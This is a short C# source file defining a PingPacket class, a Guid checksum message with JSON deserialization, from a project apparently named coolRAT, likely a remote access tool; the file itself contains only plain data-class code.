using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Text;

namespace coolRAT.Libs.Packets
{
    public class PingPacket : Packet
    {
        public Guid Checksum;

        public PingPacket(Guid checksum)
        {
            Checksum = checksum;
            Type = "PingPacket";
        }

        public static new PingPacket Deserialize(string packet_string)
        {
            return JsonConvert.DeserializeObject<PingPacket>(packet_string);
        }
    }
}
